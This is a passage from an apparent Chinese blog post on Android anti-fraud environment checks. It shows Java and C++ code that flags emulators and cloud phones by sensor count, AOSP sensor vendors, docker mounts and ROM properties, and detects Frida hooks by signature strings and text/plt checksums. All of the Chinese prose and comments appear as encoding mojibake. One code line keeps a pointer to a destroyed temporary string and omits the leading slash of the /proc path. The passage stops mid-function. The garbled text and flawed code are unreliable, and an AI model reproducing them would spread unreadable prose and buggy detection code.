//åä¸ºè£è€€20 18ä¸ªä¼ æ„Ÿå™¨</span><br><span class="line">    CLog.e(&quot;sensor types size -&gt; &quot; + sensorlist.size());</span><br><span class="line">    //æˆ‘ä»¬è®¤ä¸ºä¼ æ„Ÿå™¨å°‘äº20ä¸ªåˆ™è®¤ä¸ºæ˜¯é£é™©è®¾å¤‡</span><br><span class="line">    if (sensorlist.size() &lt; SENSOR_MINIMUM_QUANTITY_LIMIT) &#123;</span><br><span class="line">        items.add(new ListItemBean(</span><br><span class="line">                &quot;å½“å‰æ‰‹æœºå¯èƒ½æ˜¯æ¨¡æ‹Ÿå™¨&amp;äº‘æ‰‹æœº&quot;,</span><br><span class="line">                ListItemBean.RiskLeave.Warn,</span><br><span class="line">                &quot;sensor size -&gt; (&quot;+ sensorlist.size()+&quot;) \n&quot; +</span><br><span class="line">                &quot;sensor type size -&gt; (&quot;+sensorTypeS.size()+&quot;) \n&quot;</span><br><span class="line">                //+ &quot;sensor info -&gt; \n&quot;+ Sensorlist   //æ‰“å°å…¨éƒ¨ä¼ æ„Ÿå™¨ä¿¡æ¯</span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="æ£€æµ‹ä¼ æ„Ÿå™¨åç§°"><a href="#æ£€æµ‹ä¼ æ„Ÿå™¨åç§°" class="headerlink" title="æ£€æµ‹ä¼ æ„Ÿå™¨åç§°"></a>æ£€æµ‹ä¼ æ„Ÿå™¨åç§°</h4><p>è¿™å—æ£€æµ‹æ€è·¯ä¸»è¦æ˜¯æ£€æµ‹ä¼ æ„Ÿå™¨çš„åç§°ï¼Œæ­£å¸¸å°ç±³ä¹‹ç±»çš„æ‰‹æœºä»–æ˜¯ä¸å¯èƒ½å­˜åœ¨å«ä»€ä¹ˆ <code>AOSP</code>çš„ä¼ æ„Ÿå™¨çš„ ã€‚</p><p>è¿™ç§<code>AOSP</code>åŸºæœ¬éƒ½æ˜¯è‡ªå·±ç¼–è¯‘çš„<code>ROM</code> ï¼Œæ‰€ä»¥è¿™å—ä¹Ÿå¯ä»¥ä½œä¸ºç›‘æµ‹ç‚¹ ã€‚å¯ä»¥ä¸ŠæŠ¥ä¼ æ„Ÿå™¨çš„ä¸€äº›åç§°ä¿¡æ¯ï¼Œä¹Ÿæ˜¯ç¯å¢ƒæ£€æµ‹ä¸€ä¸ªå¾ˆé‡è¦çš„æŠ“æ‰‹</p><p>ä¸€èˆ¬å°ç™½è‚¯å®šä¸ä¼šè¯´å»æ”¹ä¼ æ„Ÿå™¨åç§°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.N) &#123;</span><br><span class="line">    ArrayList&lt;Sensor&gt; aospSensor = new ArrayList&lt;&gt;();</span><br><span class="line">    for(Sensor sensor:sensorlist)&#123;</span><br><span class="line">        if(sensor.getVendor().contains(&quot;AOSP&quot;))&#123;</span><br><span class="line">            aospSensor.add(sensor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (aospSensor.size()&gt;3) &#123;</span><br><span class="line">        CLog.e(&quot;ä¼ æ„Ÿå™¨å‚æ•°æ˜¯å¦å¼‚å¸¸(ç”Ÿäº§å‚å•†ä¸ºAOSP)&quot;);</span><br><span class="line">        items.add(new ListItemBean(</span><br><span class="line">                &quot;å½“å‰æ‰‹æœºå¯èƒ½æ˜¯æ¨¡æ‹Ÿå™¨&amp;äº‘æ‰‹æœº&quot;,</span><br><span class="line">                ListItemBean.RiskLeave.Warn,</span><br><span class="line">                aospSensor.size()</span><br><span class="line">                        +&quot;/&quot;+sensorlist.size()+&quot;ä¼ æ„Ÿå™¨å‚æ•°å¼‚å¸¸ -&gt; &quot;+ aospSensor</span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ£€æµ‹æŒ‚è½½æ–‡ä»¶"><a href="#æ£€æµ‹æŒ‚è½½æ–‡ä»¶" class="headerlink" title="æ£€æµ‹æŒ‚è½½æ–‡ä»¶"></a>æ£€æµ‹æŒ‚è½½æ–‡ä»¶</h4><p>è¿™å—å°±æ˜¯å»éå†<code>mounts</code> ä¸‹é¢è¿™å‡ ä¸ªæ–‡ä»¶ï¼Œæ£€æµ‹é‡Œé¢æ˜¯å¦åŒ…å«<code>docker</code>å…³é”®å­— ï¼Œé˜²æ­¢ä¸€äº›äº‘æ‰‹æœºæè™šæ‹ŸåŒ–ï¼Œé€šè¿‡ä½¿ç”¨<code>docker</code>è¿›è¡ŒæŒ‚è½½ ã€‚</p><p>è¿™å—ä¹Ÿæ˜¯å¾ˆå¥½çš„ç›‘æµ‹ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">String[] marks = &#123;&quot;docker&quot;&#125;;</span><br><span class="line">//æ£€æµ‹proc/mountsæ˜¯å¦åŒ…å«dockerå…³é”®å­—</span><br><span class="line">String mark = NativeEngine.getZhenxiInfoK(&quot;/proc/mounts&quot;,marks );</span><br><span class="line">if(mark == null)&#123;</span><br><span class="line">    mark = NativeEngine.getZhenxiInfoK(&quot;/proc/self/mountstats&quot;, marks);</span><br><span class="line">    if(mark == null)&#123;</span><br><span class="line">        mark = NativeEngine.getZhenxiInfoK(&quot;/proc/self/mountinfo&quot;, marks);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(mark!=null)&#123;</span><br><span class="line">    items.add(new ListItemBean(</span><br><span class="line">            &quot;å½“å‰æ‰‹æœºå¯èƒ½æ˜¯æ¨¡æ‹Ÿå™¨&amp;äº‘æ‰‹æœº&quot;,</span><br><span class="line">            ListItemBean.RiskLeave.Warn,</span><br><span class="line">            &quot;(mountså¼‚å¸¸)\n&quot;+mark</span><br><span class="line">    ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ£€æµ‹ROMæ˜¯å¦Match"><a href="#æ£€æµ‹ROMæ˜¯å¦Match" class="headerlink" title="æ£€æµ‹ROMæ˜¯å¦Match"></a>æ£€æµ‹ROMæ˜¯å¦Match</h4><h5 id="æ£€æµ‹ç¯å¢ƒä¿¡æ¯ï¼š"><a href="#æ£€æµ‹ç¯å¢ƒä¿¡æ¯ï¼š" class="headerlink" title="æ£€æµ‹ç¯å¢ƒä¿¡æ¯ï¼š"></a>æ£€æµ‹ç¯å¢ƒä¿¡æ¯ï¼š</h5><p>è¿™å—æ€è·¯ä¸»è¦å¥½å¤šç§ ï¼Œä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢ä¸€äº›è‡ªå®šä¹‰<code>ROM</code> ï¼Œé€šè¿‡ä¿®æ”¹æœºå‹çš„æ–¹æ³•ï¼Œç»•è¿‡è‡ªå®šä¹‰<code>ROM</code>æ£€æµ‹é€ƒé€¸ </p><p>å¯ä»¥ç›´æ¥æ‰§è¡Œ<code>getprop</code> æŠŠæ‰€æœ‰çš„ç¯å¢ƒä¿¡æ¯éƒ½æ‹¿åˆ°æ‰‹ ï¼Œå¦‚æœæ˜¯å°ç±³æ‰‹æœºï¼Œé‡Œé¢ç¯å¢ƒä¿¡æ¯é‡Œé¢ï¼Œè‚¯å®šæ˜¯æœ‰MIUIå…³é”®å­—ã€‚</p><p>æ¯”å¦‚å°ç±³çš„æ‰‹æœºï¼Œæˆ‘ä¼šå»æ£€æµ‹æ˜¯å¦åŒ…å«è¿™å‡ ä¸ªå…³é”®ç¯å¢ƒä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static final String KEY_MIUI_VERSION_NAME = &quot;ro.miui.ui.version.name&quot;;</span><br><span class="line">private static final String KEY_MIUI_VERSION_CODE = &quot;ro.miui.ui.version.code&quot;;</span><br><span class="line">private static final String KEY_MIUI_INTERNAL_STORAGE = &quot;ro.miui.internal.storage&quot;;</span><br></pre></td></tr></table></figure><p>è¿™å—å¯ä»¥é‡‡é›†ä»¥åæœåŠ¡ç«¯è¿›è¡Œåˆ¤æ–­ã€‚é˜²æ­¢è‡ªå®šä¹‰ROM æœºå‹ä¼ªé€ </p><h5 id="æ£€æµ‹æœåŠ¡åˆ—è¡¨ï¼š"><a href="#æ£€æµ‹æœåŠ¡åˆ—è¡¨ï¼š" class="headerlink" title="æ£€æµ‹æœåŠ¡åˆ—è¡¨ï¼š"></a>æ£€æµ‹æœåŠ¡åˆ—è¡¨ï¼š</h5><p>è¿™å—è¿˜æ˜¯æ‰§è¡Œ <code>service list</code> ï¼Œä¸€èˆ¬å°ç±³æ‰‹æœºä¹‹ç±»çš„ï¼Œéƒ½ä¼šæœ‰å°ç±³çš„ç³»ç»ŸæœåŠ¡ï¼Œè¿™ç§ä¸œè¥¿å¾ˆéš¾å»ä¼ªé€ ï¼Œå¦‚æœä»–ä¼ªé€ äº†å‡çš„ ã€‚ä½ å°±å°è¯•è°ƒç”¨å³å¯</p><p>è¿™å—è¿˜æ˜¯å»ºè®®ä¸Šä¼ åˆ°æœåŠ¡ç«¯ï¼Œç”±æœåŠ¡ç«¯ç®—æ³•åŒå­¦å»æ ¹æ®ç›¸ä¼¼åº¦ç®—æ³•å»æ¨æ–­ï¼Œä¸è¦å†æœ¬åœ°è¿›è¡Œåˆ¤æ–­ ï¼Œå› ä¸º<code>Hunter</code>æ˜¯éè”ç½‘<code>Apk</code>ï¼Œæ‰€ä»¥åªæ˜¯åœ¨å®¢æˆ·ç«¯æ‰“äº†ä¸ªæ ·å­</p><h3 id="æ£€æµ‹å½“å‰ç¯å¢ƒæ˜¯å¦è¢«Hook"><a href="#æ£€æµ‹å½“å‰ç¯å¢ƒæ˜¯å¦è¢«Hook" class="headerlink" title="æ£€æµ‹å½“å‰ç¯å¢ƒæ˜¯å¦è¢«Hook"></a>æ£€æµ‹å½“å‰ç¯å¢ƒæ˜¯å¦è¢«Hook</h3><p>è¿™å—æ£€æµ‹æ–¹æ³•åƒå¥‡ç™¾æ€ªï¼Œé¦–å…ˆæœ€åŸºæœ¬mapså»æ£€æµ‹fridaæˆ–è€…æ ¹æ®è°ƒç”¨æ ˆæ£€æµ‹lspç‰¹å¾ ï¼ŒåŸºç¡€çš„æ£€æµ‹æ–¹æ¡ˆä¸è¯´äº† ã€‚å› ä¸ºæˆ‘è§‰å¾—å¹¶ä¸æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æ–¹æ¡ˆ ã€‚æ”¹ä¸ªåå°±ç»•è¿‡äº† ã€‚</p><p>æ¯”å¦‚fridaç‰¹å¾ä¸‰ä»¶å¥— ã€‚æ£€æµ‹æ€è·¯ä¸»è¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static const char *FRIDA_THREAD_GUM_JS_LOOP = &quot;gum-js-loop&quot;;</span><br><span class="line">static const char *FRIDA_THREAD_GMAIN = &quot;gmain&quot;;</span><br><span class="line">static const char *FRIDA_NAMEDPIPE_LINJECTOR = &quot;linjector&quot;;</span><br></pre></td></tr></table></figure><p>Hookæ£€æµ‹ï¼Œæˆ‘ä»¬å…¶å®åªéœ€è¦æ£€æµ‹å†…å­˜æ²¡æœ‰è¢«ä¿®æ”¹å³å¯ ã€‚è¿™å—éœ€è¦ä»‹ç»ä¸€ä¸‹åŸºç¡€åŸç†ã€‚å’Œå®ç°çš„ä¼ªä»£ç  ã€‚</p><p>æ­£å¸¸æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªSOåŠ è½½åˆ°å†…å­˜é‡Œï¼Œæœ¬è´¨ä¸Šæ˜¯é€šè¿‡mmapæŠŠsoåˆ†é…åˆ°å†…å­˜é‡Œé¢ ï¼Œæ¯”å¦‚Aå‡½æ•°çš„æŒ‡ä»¤æ˜¯BBBï¼Œé‚£ä¹ˆåŠ è½½åˆ°å†…å­˜é‡Œé¢åº”è¯¥ä¹Ÿæ˜¯BBB ã€‚</p><p>è®°ä½ä¸Šé¢è¿™å¥è¯ ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹å†…å­˜é‡Œé¢çš„æŒ‡ä»¤è½¬æ¢æˆä¸€ä¸ªintå€¼ï¼Œç„¶åç´¯åŠ  ã€‚å¦‚æœå†…å­˜æ²¡æœ‰è¢«ä¿®æ”¹ ï¼Œç´¯åŠ å€¼æ–‡ä»¶é‡Œé¢å’Œå†…å­˜é‡Œé¢çš„å€¼åº”è¯¥æ˜¯ä¸€æ ·çš„ ã€‚</p><p>å› ä¸ºç°åœ¨HookåŸºæœ¬éƒ½æ˜¯textæ®µå’Œpltç«¯ï¼Œä¸€ä¸ª<code>inlinehook</code>ä¸€ä¸ª<code>got</code>è¡¨ ã€‚å½“ç„¶Fridaå¯èƒ½ä¼šå»¶è¿Ÿå¯åŠ¨ ï¼Œæ‰€ä»¥å¼€å¯ä¸€æ¡æ£€æµ‹çº¿ç¨‹ï¼Œè¿›è¡Œè½®è®­æ“ä½œã€‚</p><p>è¿™å—è¿˜æœ‰ä¸€ä¸ªè®¾è®¡é—®é¢˜ï¼Œå¾ˆå¤šå¼€å‘è€…ä¹Ÿéƒ½æ²¡æ³¨æ„åˆ° ï¼Œå°±æ˜¯æˆ‘å¼€å¯çš„è¿™ä¸€æ¡çº¿ç¨‹ï¼Œè¢«æ”»å‡»è€…<code>anti</code>æ‰ åº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>å› ä¸ºæƒ³è¦antiæ‰ä¸€æ¡æ£€æµ‹çº¿ç¨‹ï¼Œæ–¹æ³•å¤ªå¤šäº†ï¼ŒNç§æ–¹æ³•ï¼Œæ¯”å¦‚ç›‘å¬å…¨éƒ¨çº¿ç¨‹çš„æ–‡ä»¶è¯»å†™ï¼Œçœ‹çœ‹é‚£ä¸ªçº¿ç¨‹åœ¨è¯»å–æ–‡ä»¶ ï¼Œåªåšè¿™ä¸€ä»¶äº‹ï¼ŒåŸºæœ¬å…«ä¹ä¸ç¦»å ï¼Œ</p><p>ä¹Ÿå¯ä»¥ç›´æ¥Hookå¼€å¯çº¿ç¨‹çš„æ–¹æ³•ï¼Œå¯¹å¼€å¯çš„çº¿ç¨‹è¿›è¡Œanti ã€‚å½“ç„¶è¿™ç§æ€è·¯ å°±æ²¡æœ‰å¥½çš„å¯¹æŠ—æˆ–è€…æ£€æµ‹åŠæ³•äº†ä¹ˆï¼Ÿ</p><blockquote><p><strong>å…¶å®å¾ˆç®€å• ï¼Œåªéœ€è¦æŠŠåœ¨ä½ çš„æ£€æµ‹ä»£ç é‡Œï¼Œå¯¹æŸä¸ªå˜é‡è¿›è¡Œèµ‹å€¼ ï¼Œä¿®æ”¹flagå³å¯ ã€‚</strong></p><p><strong>ç„¶åç¬¬ä¸€æ¬¡æ£€æµ‹å®Œæ¯•ä»¥åå°†ä¸»è¿›ç¨‹çš„æŸä¸ªå˜é‡æ ‡å¿—ä¸ºtrueï¼Œå¯ä»¥ä½¿ç”¨__NR_process_vm_writev ï¼Œåˆå› ä¸ºæ˜¯å¼‚æ­¥çš„å…³ç³»ï¼Œä¸»çº¿ç¨‹å¯ä»¥å»¶è¿Ÿ2ç§’å¯¹è¿™ä¸ªæ ‡è¯†è¿›è¡Œè·å–ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºtrue ï¼Œ</strong></p><p><strong>ä»¥ç¡®ä¿æ£€æµ‹çº¿ç¨‹æˆåŠŸå¼€å¯ ã€‚</strong></p></blockquote><p>å…·ä½“æ£€æµ‹æµç¨‹å¦‚ä¸‹ï¼Œä»¥æ£€æµ‹libcä¸ºä¾‹å­ï¼Œè·¯å¾„å¯ä»¥æ¢æˆè‡ªå·±éœ€è¦çš„è·¯å¾„ ï¼š</p><p>é¦–å…ˆè·å–æœ¬åœ°Soæ–‡ä»¶çš„ç´¯åŠ å€¼ ï¼Œè¿”å›<code>execSection</code> ç»“æ„ä½“ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">//è®°å½•å¯æ‰§è¡Œæ®µçš„ç»“æ„ä½“,ä¸€ä¸ªæ˜¯pltæ®µä¸€ä¸ªæ˜¯textæ®µ</span><br><span class="line">//æ‰€ä»¥å¯¹åº”çš„æ•°é‡æ˜¯2</span><br><span class="line">typedef struct stExecSection &#123;</span><br><span class="line">    int execSectionCount;</span><br><span class="line">    unsigned long offset[2];</span><br><span class="line">    unsigned long memsize[2];</span><br><span class="line">    unsigned long checksum[2];</span><br><span class="line">    unsigned long startAddrinMem;</span><br><span class="line">    bool isSuccess = false;</span><br><span class="line">&#125; execSection;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/**</span><br><span class="line"> * è·å–æœ¬åœ°æ–‡ä»¶çš„ Check sum</span><br><span class="line"> * è¯»å–è€—æ—¶æ“ä½œ,åªåˆå§‹åŒ–ä¸€æ¬¡ä¿å­˜åˆ°æœ¬åœ°ã€‚</span><br><span class="line"> */</span><br><span class="line">execSection fetch_checksum_of_library(const char *filePath) &#123;</span><br><span class="line">    execSection section = &#123;0&#125;;</span><br><span class="line">    Elf_Ehdr ehdr;</span><br><span class="line">    Elf_Shdr sectHdr;</span><br><span class="line">    int fd;</span><br><span class="line">    int execSectionCount = 0;</span><br><span class="line">    fd = my_openat(AT_FDCWD, filePath, O_RDONLY, 0);</span><br><span class="line">    if (fd &lt; 0) &#123;</span><br><span class="line">        return section;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    my_read(fd, &amp;ehdr, sizeof(Elf_Ehdr));</span><br><span class="line">    my_lseek(fd, (off_t) ehdr.e_shoff, SEEK_SET);</span><br><span class="line"> </span><br><span class="line">    unsigned long memSize[2] = &#123;0&#125;;</span><br><span class="line">    unsigned long offset[2] = &#123;0&#125;;</span><br><span class="line"> </span><br><span class="line">    //æŸ¥æ‰¾sectionçš„pltå’Œtextå¼€å§‹ä½ç½®å’Œé•¿åº¦</span><br><span class="line">    for (int i = 0; i &lt; ehdr.e_shnum; i++) &#123;</span><br><span class="line">        my_memset(&amp;sectHdr, 0, sizeof(Elf_Shdr));</span><br><span class="line">        my_read(fd, &amp;sectHdr, sizeof(Elf_Shdr));</span><br><span class="line">        //é€šå¸¸ PLT and Text ä¸€èˆ¬éƒ½æ˜¯å¯æ‰§è¡Œæ®µ</span><br><span class="line">        if (sectHdr.sh_flags &amp; SHF_EXECINSTR) &#123;</span><br><span class="line">            offset[execSectionCount] = sectHdr.sh_offset;</span><br><span class="line">            memSize[execSectionCount] = sectHdr.sh_size;</span><br><span class="line">            execSectionCount++;</span><br><span class="line">            if (execSectionCount == 2) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (execSectionCount == 0) &#123;</span><br><span class="line">        LOG(INFO) &lt;&lt; &quot;get elf section error &quot; &lt;&lt; filePath;</span><br><span class="line">        my_close(fd);</span><br><span class="line">        return section;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    //è®°å½•ä¸ªæ•°</span><br><span class="line">    section.execSectionCount = execSectionCount;</span><br><span class="line"> </span><br><span class="line">    section.startAddrinMem = 0;</span><br><span class="line">    for (int i = 0; i &lt; execSectionCount; i++) &#123;</span><br><span class="line">        my_lseek(fd, (off_t) offset[i], SEEK_SET);</span><br><span class="line">        //void * buffer = alloca(memSize[i] * sizeof(uint8_t));</span><br><span class="line">        //å­˜æ”¾textæˆ–è€…pltå…¨éƒ¨çš„æ•°æ®å†…å®¹,å¤§çº¦5-10Må¤§å°,ä¸ºäº†å…¼å®¹å°å†…å­˜æ‰‹æœºã€‚</span><br><span class="line">        //æ‰€ä»¥æ”¾åœ¨å †é‡Œé¢,è€Œä¸æ˜¯æ ˆ,é˜²æ­¢å°å†…å­˜æ‰‹æœºæ ˆæŒ‡é’ˆæº¢å‡ºã€‚</span><br><span class="line">        auto buffer = (void *) calloc(1, memSize[i] * sizeof(uint8_t));</span><br><span class="line">        if (buffer == nullptr) &#123;</span><br><span class="line">            free(buffer);</span><br><span class="line">            return section;</span><br><span class="line">        &#125;</span><br><span class="line">        my_read(fd, buffer, memSize[i]);</span><br><span class="line">        section.offset[i] = offset[i];</span><br><span class="line">        section.memsize[i] = memSize[i];</span><br><span class="line">        section.checksum[i] = checksum(buffer, memSize[i]);</span><br><span class="line"> </span><br><span class="line">//        LOGE(&quot;fetch_checksum_of_library %s ExecSection:[%d][%ld][%ld][%ld]&quot;,</span><br><span class="line">//             filePath, i, offset[i], memSize[i], section-&gt;checksum[i])</span><br><span class="line">        free(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    section.isSuccess = true;</span><br><span class="line">    my_close(fd);</span><br><span class="line">    return section;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå’Œæœ¬åœ°çš„æŒ‡ä»¤å»è®¡ç®— ã€‚è®¡ç®—æœ¬åœ°çš„æŒ‡ä»¤æ–¹æ³•å°±æ˜¯å¯¹mapsè¿›è¡Œéå†ï¼Œåªéå†textå’Œpltæ®µ ï¼Œè®¡ç®—ç´¯åŠ å€¼å’Œæœ¬åœ°è¿›è¡Œåˆ¤æ–­ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * æ£€æµ‹é—®çš„check sum</span><br><span class="line"> * æ£€æµ‹åˆ°checkæœªä¿®æ”¹è¿”å›0</span><br><span class="line"> * æ£€æµ‹å·²ä¿®æ”¹è¿”å›1</span><br><span class="line"> * æ£€æµ‹å¤±è´¥è¿”å›-1</span><br><span class="line"> */</span><br><span class="line">int detect_elf_checksum(const char *soPath, execSection *pSection) &#123;</span><br><span class="line">    if (pSection == nullptr) &#123;</span><br><span class="line">        LOGI(&quot;detect_elf_checksum execSection == null  &quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    char map[MAX_LINE];</span><br><span class="line">    const char *maps_path = string(&quot;proc/&quot;).append(to_string(getpid())).append(&quot;/maps&quot;).c_str();</span><br><span class="line"> </span><br><span class="line">    int fd = my_openat(AT_FDCWD, maps_path, O_RDONLY, 0);</span><br><span class="line"> </span><br><span class="line">    if (fd &lt;= 0) &#123;</span><br><span class="line">        LOGE(&quot;detect_elf_checksum open %s fail &quot;, PROC_MAPS);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    int checkSum = 0;</span><br><span class="line">    while ((read_one_line(fd, map, MAX_LINE)) &gt; 0) &#123;</span><br><span class="line">        if (my_strstr(map, soPath) != nullptr) &#123;</span><br><span class="line">            checkSum = scan_executable_segments(map, pSection, soPath);</span><br><span class="line">            if (checkSum == 1) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    my_close(fd);</span><br><span class="line">    return checkSum;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">/**</span><br><span class="line"> * æ£€æµ‹é—®çš„check sum</span><br><span class="line"> * æ£€æµ‹åˆ°checkæœªä¿®æ”¹è¿”å›0</span><br><span class="line"> * æ£€æµ‹å·²ä¿®æ”¹è¿”å›1</span><br><span class="line"> * æ£€æµ‹å¤±è´¥è¿”å›-1</span><br><span class="line"> */</span><br><span class="line">int scan_executable_segments(</span><br><span class="line">        char *mapItem,</span><br><span class="line">        execSection *pElfSectArr,</span><br><span class="line">        const char *libraryName) &#123;</span><br><span class="line">    unsigned long start, end;</span><br><span class="line">    char buf[MAX_LINE] = &quot;&quot;;</span><br><span class="line">    char path[MAX_LENGTH] = &quot;&quot;;</span><br><span class="line">    char tmp[100] = &quot;&quot;;</span><br><span class="line"> </span><br><span class="line">    sscanf(mapItem, &quot;%lx-%lx %s %s %s %s %s&quot;, &amp;start, &amp;end, buf, tmp, tmp, tmp, path);</span><br><span class="line"> </span><br><span class="line">    if (buf[2] == &#x27;x&#x27;) &#123;</span><br><span class="line">        if (buf[0] == &#x27;r&#x27;) &#123;</span><br><span class="line">            uint8_t *buffer;</span><br><span class="line"> </span><br><span class="line">            buffer = (uint8_t *) start;</span><br><span class="line">            for (int i = 0; i &lt; pElfSectArr-&gt;execSectionCount; i++) &#123;</span><br><span class="line">                if (start + pElfSectArr-&gt;offset[i] + pElfSectArr-&gt;memsize[i] &gt; end) &#123;</span><br><span class="line">                    if (pElfSectArr-&gt;startAddrinMem != 0) &#123;</span><br><span class="line">                        buffer = (uint8_t *) pElfSectArr-&gt;startAddrinMem;</span><br><span class="line">                        pElfSectArr-&gt;startAddrinMem = 0;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            for (int i = 0; i &lt; pElfSectArr-&gt;execSectionCount; i++) &#123;</span><br><span class="line">                auto begin = (void *) (buffer + pElfSectArr-&gt;offset[i]);</span><br><span class="line">                unsigned long size = pElfSectArr-&gt;memsize[i];</span><br><span class="line">                LOGI(&quot;%s [%p] size -&gt;[%lu]&quot;, libraryName, begin, size);</span><br><span 